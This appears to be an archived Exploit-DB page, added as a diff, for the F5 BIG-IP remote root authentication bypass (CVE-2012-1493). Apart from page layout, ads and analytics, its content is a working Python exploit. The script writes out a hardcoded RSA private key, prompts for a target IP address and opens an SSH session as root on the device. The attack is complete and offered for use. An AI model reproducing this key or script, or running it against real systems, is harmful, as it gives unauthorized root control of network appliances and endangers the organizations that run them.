@@ -1,0 +1,289 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+	<head><script type="text/javascript" src="/static/js/analytics.js?v=1513275608.0" charset="utf-8"></script>
+
+<script type="text/javascript">archive_analytics.values.service='wb';archive_analytics.values.server_name='wwwb-app39.us.archive.org';archive_analytics.values.server_ms=1354;</script><script type="text/javascript" src="/static/js/wbhack.js?v=1513275608.0" charset="utf-8"></script>
+
+<script type="text/javascript">
+__wbhack.init('http://web.archive.org/web');
+</script>
+<link rel="stylesheet" type="text/css" href="/static/css/banner-styles.css?v=1513275608.0" />
+<link rel="stylesheet" type="text/css" href="/static/css/iconochive.css?v=1513275608.0" />
+
+<!-- End Wayback Rewrite JS Include -->
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<title>F5 BIG-IP Remote Root Authentication Bypass Vulnerability</title>
+		<meta name="description" content=""/>
+		<meta name="keywords" content=""/>
+		<script type="text/javascript" src="http://web.archive.org/web/20120802041555js_/http://www.exploit-db.com/wp-content/themes/exploit/scripts/shCore.js"></script>
+		<script type="text/javascript" src="http://web.archive.org/web/20120802041555js_/http://www.exploit-db.com/wp-content/themes/exploit/scripts/shBrushPlain.js"></script>
+					<script type="text/javascript" src="http://web.archive.org/web/20120802041555js_/http://www.exploit-db.com/wp-content/themes/exploit/scripts/shBrushPython.js"></script>
+		        <script type="text/javascript" src="http://web.archive.org/web/20120802041555js_/http://www.exploit-db.com/wp-content/themes/exploit/js/jquery-1.4.2.min.js"></script>
+        <script type="text/javascript" src="http://web.archive.org/web/20120802041555js_/http://www.exploit-db.com/wp-content/themes/exploit/js/jquery.rating.pack.js"></script>
+        <script type="text/javascript" src="http://web.archive.org/web/20120802041555js_/http://www.exploit-db.com/wp-content/themes/exploit/js/jquery.fancybox/jquery.fancybox-1.3.1.pack.js"></script>
+        <link rel="stylesheet" href="http://web.archive.org/web/20120802041555cs_/http://www.exploit-db.com/wp-content/themes/exploit/js/jquery.fancybox/jquery.fancybox-1.3.1.css" type="text/css" media="screen"/>
+        <link type="text/css" rel="stylesheet" href="http://web.archive.org/web/20120802041555cs_/http://www.exploit-db.com/wp-content/themes/exploit/styles/shCore.css"/>
+        <link type="text/css" rel="stylesheet" href="http://web.archive.org/web/20120802041555cs_/http://www.exploit-db.com/wp-content/themes/exploit/styles/shThemeDefault.css"/>
+        <link type="text/css" rel="stylesheet" href="http://web.archive.org/web/20120802041555cs_/http://www.exploit-db.com/wp-content/themes/exploit/styles/jquery.rating.css"/>
+        <link type="text/css" rel="stylesheet" href="http://web.archive.org/web/20120802041555cs_/http://www.exploit-db.com/wp-content/themes/exploit/styles/exploit.css"/>
+		<link rel="stylesheet" id="shutter-css" href="/web/20120802041555cs_/http://www.exploit-db.com:80/slider/shutter-reloaded.css?ver=1.3.0" type="text/css" media="screen"/>
+		<link type="text/css" rel="stylesheet" href="/web/20120802041555cs_/http://www.exploit-db.com:80/wp-content/themes/exploit/digi.css"/>
+
+		<style type="text/css">
+		h1 {
+		font-size:22px !important;
+		}
+		.barColor {
+		display:table;
+		clear:both;
+		background-color:#d5d7dd;
+		width:1280px;
+		border:solid #aaa 1px;
+		-webkit-border-radius:5px;
+		-moz-border-radius:5px;
+		border-radius:5px;
+		margin:10px auto 10px auto;
+		}
+		body {
+		background-color:#292929;
+		margin:0px;
+		font-size:14px;
+		}
+		#container {
+		display:block;
+		background-color:#fff;
+		width:1270px;
+		position:relative;
+		left:0px;
+		padding:0 0 0 10px;
+		margin:0 auto -40px auto;
+		/*border:solid #ddd 1px;*/
+		-webkit-border-radius:5px;
+		-moz-border-radius:5px;
+		border-radius:5px;
+		}
+		pre {
+		width:1200px !important;
+		overflow:auto !important;
+		}
+		table {
+		background-color:#f5f5f5;
+		border:solid #aaa 1px;
+		-webkit-border-radius:5px;
+		-moz-border-radius:5px;
+		border-radius:5px;
+		}
+		
+		tr.meta td {font-weight:bold; color:#606060;}
+		table.comment.odd {
+		width:710px;
+		background-color:#f8f8f8;
+		padding:10px;
+		margin:10px;
+		border:solid #ccc 1px;
+		margin-left:auto; margin-right:auto;
+		}
+
+		table.comment.even {
+		width:710px;
+		background-color:#f8f8f8;
+		padding:10px;
+		margin:10px;
+		border:solid #ccc 1px;
+		margin-left:auto; margin-right:auto;
+		}
+		a img {
+		border:none;
+		border-style:none;
+		}
+		#screenshot_upload_form {
+		margin: 0px auto 10px auto;
+		}
+		</style>
+        <script type="text/javascript">
+                SyntaxHighlighter.config.clipboardSwf = '/scripts/clipboard.swf';
+                SyntaxHighlighter.all();
+        </script>
+	</head>
+	<body>
+<div class="barColor">
+		
+	<div id="topAd" style="position:relative; float:right; margin:5px 20px 5px 20px;">
+		<script type="text/javascript"><!--
+		google_ad_client = "ca-pub-0054251952045395";
+		/* Exploit Database Rectangle */
+		google_ad_slot = "6779138874";
+		google_ad_width = 336;
+		google_ad_height = 280;
+		//-->
+		</script>
+		<script type="text/javascript" src="http://web.archive.org/web/20120802041555js_/http://pagead2.googlesyndication.com/pagead/show_ads.js">
+		</script>
+	</div>
+					<h1 style="position:relative; left:30px;">F5 BIG-IP Remote Root Authentication Bypass Vulnerability</h1>
+		
+		<br/><br/>
+
+		<table style=" position:relative; left:50px; top:-10px; height:110px; float:left;">
+		
+			<tr>
+			<td style="background-color:#fff; padding:5px;">EDB-ID: <span class="r1">19091</span> </td>
+			<td style="background-color:#fff; padding:5px;">  CVE:  <a rel="nofollow" href="http://web.archive.org/web/20120802041555/http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1493" target="_blank">2012-1493</a></td>
+			<td style="background-color:#fff; padding:5px;">OSVDB-ID: <a rel="nofollow" href="http://web.archive.org/web/20120802041555/http://osvdb.org/show/osvdb/82780" target="_blank">82780</a></td>
+			</tr>
+				
+			<tr>
+			<td style="background-color:#fff; padding:5px;">Author: David Kennedy (ReL1K)</td>
+			<td style="background-color:#fff; padding:5px;">Published: 2012-06-12</td>
+			<td style="background-color:#fff; padding:5px;">Verified: <img src="http://web.archive.org/web/20120802041555im_/http://www.exploit-db.com/images/accept.png" alt="Verified"/></td>
+			</tr>
+			
+			<tr>
+			<td style="background-color:#fff; padding:5px;">Exploit Code: &nbsp;&nbsp;<a href="/web/20120802041555/http://www.exploit-db.com:80/download/19091"><img src="/web/20120802041555im_/http://www.exploit-db.com:80/images/46.png" style="position:relative; top:5px;" alt="Download" title="Download" border="0"/></a></td>
+			<td style="background-color:#fff; padding:5px;">Vulnerable App: &nbsp;&nbsp;N/A</td>
+			<td style="background-color:#fff; padding:5px;">
+			
+			
+			
+			</td>
+			</tr>
+		</table>
+		
+		<table style="position:relative; top:-10px; height:110px;  float:left; margin-left:60px;">
+		<tr><td style="background-color:#fff; margin:5px;">
+		<div id="rating2">
+			
+			<h2 style="margin-bottom:0px; font-size:14px;">Rating</h2>
+			<form action="" method="post">
+				<label>Overall:</label>
+				<input name="rate" type="radio" class="star total-rating" value="1"/>
+				<input name="rate" type="radio" class="star total-rating" value="2"/>
+				<input name="rate" type="radio" class="star total-rating" value="3"/>
+				<input name="rate" type="radio" class="star total-rating" value="4"/>
+				<input name="rate" type="radio" class="star total-rating" value="5"/>
+				<span class="num_value">
+					(0.0)				</span>
+			</form>
+			<div class="clear"></div>
+							<!-- 
+				<p><a href="http://www.exploit-db.com/?page_id=1321?redirect_to=http://www.exploit-db.com/exploits/19091">Login</a>/<a href="">Register</a> to be able to rate exploits</p>
+				 -->
+						<script type="text/javascript">
+			$(document).ready(function(){
+				$('input.total-rating').rating('readOnly');
+				$('input.my-rate').rating('readOnly');
+				$("a#single_image").fancybox();
+			});
+			</script>
+		</div> <!--end of #rating-->
+		
+		</td></tr></table>
+		
+		<div style="display:table; table-layout:fixed; width:700px; float:left; margin-left:30px;">
+		
+				
+			<a style="text-decoration:none; color:#000;" href="http://web.archive.org/web/20120802041555/http://www.exploit-db.com/exploits/19089/"><img src="http://web.archive.org/web/20120802041555im_/http://www.exploit-db.com/images/prev.png" alt="Prev" style="border:none; border-style:none;"/></a>
+						
+			 <a style="text-decoration:none; color:#000;" href="http://web.archive.org/web/20120802041555/http://www.exploit-db.com/"><img src="http://web.archive.org/web/20120802041555im_/http://www.exploit-db.com/images/back.png" alt="Home" style="border:none; border-style:none;"/></a>
+			
+						<a style="text-decoration:none; color:#000;" href="http://web.archive.org/web/20120802041555/http://www.exploit-db.com/exploits/19092/"><img src="http://web.archive.org/web/20120802041555im_/http://www.exploit-db.com/images/next.png" alt="Next" style="border:none; border-style:none;"/></a>
+					</div>
+
+</div><!--// top color //-->
+		
+
+		 		
+		<div id="container">
+			<pre class="brush: py;gutter:false;auto-links: false;;">#!/usr/bin/python
+#
+# Title: F5 BIG-IP Remote Root Authentication Bypass Vulnerability (py)
+#
+# Quick script written by Dave Kennedy (ReL1K) for F5 authentication root bypass
+# http://www.secmaniac.com
+#
+#
+import subprocess,os
+  
+filewrite = file(&quot;priv.key&quot;, &quot;w&quot;)
+filewrite.write(&quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----
+MIICWgIBAAKBgQC8iELmyRPPHIeJ//uLLfKHG4rr84HXeGM+quySiCRgWtxbw4rh
+UlP7n4XHvB3ixAKdWfys2pqHD/Hqx9w4wMj9e+fjIpTi3xOdh/YylRWvid3Pf0vk
+OzWftKLWbay5Q3FZsq/nwjz40yGW3YhOtpK5NTQ0bKZY5zz4s2L4wdd0uQIBIwKB
+gBWL6mOEsc6G6uszMrDSDRbBUbSQ26OYuuKXMPrNuwOynNdJjDcCGDoDmkK2adDF
+8auVQXLXJ5poOOeh0AZ8br2vnk3hZd9mnF+uyDB3PO/tqpXOrpzSyuITy5LJZBBv
+7r7kqhyBs0vuSdL/D+i1DHYf0nv2Ps4aspoBVumuQid7AkEA+tD3RDashPmoQJvM
+2oWS7PO6ljUVXszuhHdUOaFtx60ZOg0OVwnh+NBbbszGpsOwwEE+OqrKMTZjYg3s
+37+x/wJBAMBtwmoi05hBsA4Cvac66T1Vdhie8qf5dwL2PdHfu6hbOifSX/xSPnVL
+RTbwU9+h/t6BOYdWA0xr0cWcjy1U6UcCQQDBfKF9w8bqPO+CTE2SoY6ZiNHEVNX4
+rLf/ycShfIfjLcMA5YAXQiNZisow5xznC/1hHGM0kmF2a8kCf8VcJio5AkBi9p5/
+uiOtY5xe+hhkofRLbce05AfEGeVvPM9V/gi8+7eCMa209xjOm70yMnRHIBys8gBU
+Ot0f/O+KM0JR0+WvAkAskPvTXevY5wkp5mYXMBlUqEd7R3vGBV/qp4BldW5l0N4G
+LesWvIh6+moTbFuPRoQnGO2P6D7Q5sPPqgqyefZS
+-----END RSA PRIVATE KEY-----&quot;&quot;&quot;)
+filewrite.close()
+subprocess.Popen(&quot;chmod 700 priv.key&quot;, shell=True).wait()
+  
+ipaddr=raw_input(&quot;Enter the IP address of the F5: &quot;)
+subprocess.Popen(&quot;ssh -i priv.key root@%s&quot; % (ipaddr), shell=True).wait()
+ 
+if os.path.isfile(&quot;priv.key&quot;):
+    os.remove(&quot;priv.key&quot;)
+</pre>
+		</div>
+<br/><br/><br/>
+
+<div class="barColor">		
+<center>
+<br/><br/>
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-0054251952045395";
+/* Exploit single page ad */
+google_ad_slot = "4301625741";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript" src="http://web.archive.org/web/20120802041555js_/http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</center>
+	
+		<script type="text/javascript">
+		function toggle(obj) {
+			var el = document.getElementById(obj);
+			el.style.display = (el.style.display != 'none' ? 'none' : 'block' );
+		}
+		</script>
+		
+		<br/>
+
+		<fieldset id="digicomments" style="width:755px;  margin-left:auto; margin-right:auto; background-color:#eaeaea;"> 
+		<legend>Comments</legend>
+		<div id="comments2">
+			
+										<h3>No comments so far</h3>
+										<!-- <p><a href="http://www.exploit-db.com/?page_id=1321?redirect_to=http://www.exploit-db.com/exploits/19091">Login</a>/<a href="http://www.exploit-db.com/?page_id=1323">Register</a> to be able to post comments</p> -->
+					</div>
+		</fieldset>
+
+<br/><br/>
+<center>
+<div id="footer">
+
+
+<br/><br/>
+
+        &copy; Offensive Security 2011
+</div></center>
+			<script type="text/javascript">
+				var gaJsHost = (("https:" == document.location.protocol) ? "http://web.archive.org/web/20120802041555/https://ssl./" : "http://web.archive.org/web/20120802041555/http://www./");
+				document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+			</script>
+			<script type="text/javascript">
+				try {
+					var pageTracker = _gat._getTracker("UA-1981501-4");
+					pageTracker._trackPageview();
+					} catch(err) {}
+			</script>	
+		</div>
+</body>
+</html>
